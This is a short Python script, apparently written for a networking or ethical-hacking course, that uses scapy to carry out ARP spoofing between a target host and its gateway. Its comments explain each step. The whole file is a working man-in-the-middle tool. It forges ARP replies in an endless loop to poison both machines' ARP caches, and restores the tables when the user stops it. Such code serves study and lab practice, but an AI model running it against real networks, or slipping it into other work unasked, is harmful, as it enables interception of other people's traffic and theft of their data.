import scapy.all as scapy
import time
import sys
#same as scan function in network scanner file
#except that there is only one ip am searching for it's mac
#in scan iteration takes place on the whole network
#get mac only one ip is being pinged for an answered list
#answered list contains two parts we are intersted in answered_list the first element in it
#answered list [0][1] <= 1 came from the response to the request when showing the packet
#return the source mac address
def get_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
	arp_request_broadcast = broadcast/arp_request
	answered = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
	return answered[0][1].hwsrc
#op = 2 means it is a response
#hwdst hardware destination address = mac address of the reciever of the response
#forging packet to be as if it were from the router
#sending the packet
def spoof(target_ip,spoof_ip):
	target_mac = get_mac(target_ip)
	arp_response = scapy.ARP(op = 2,hwdst = target_mac,psrc = spoof_ip,pdst = target_ip)
	scapy.send(arp_response,verbose = False)
#arp table fix table after keyboard interrupt 
def restore(source_ip,destination_ip):
	source_mac = get_mac(source_ip)
	destination_mac = get_mac(destination_ip)
	arp_response = scapy.ARP(op = 2,hwdst = destination_mac ,psrc = source_ip ,pdst = destination_ip ,hwsrc = source_mac )
	scapy.send(arp_response,verbose = False,count = 4)
#main function <-------------------------------------------------------> below
counter = 0
target_ip = "10.0.2.15"
gateway_ip = "10.0.2.1"
try:
	while True:
		spoof(target_ip,gateway_ip)
		spoof(gateway_ip,target_ip)
		counter = counter + 2
		print("\r[+] # packets of sent "+str(counter)),
		sys.stdout.flush()
		time.sleep(2)
except KeyboardInterrupt:
	print("\n[-] Quitting...... now")
	restore(target_ip,gateway_ip)
	restore(gateway_ip,target_ip)
	print("Finished fixing arp table .... ")
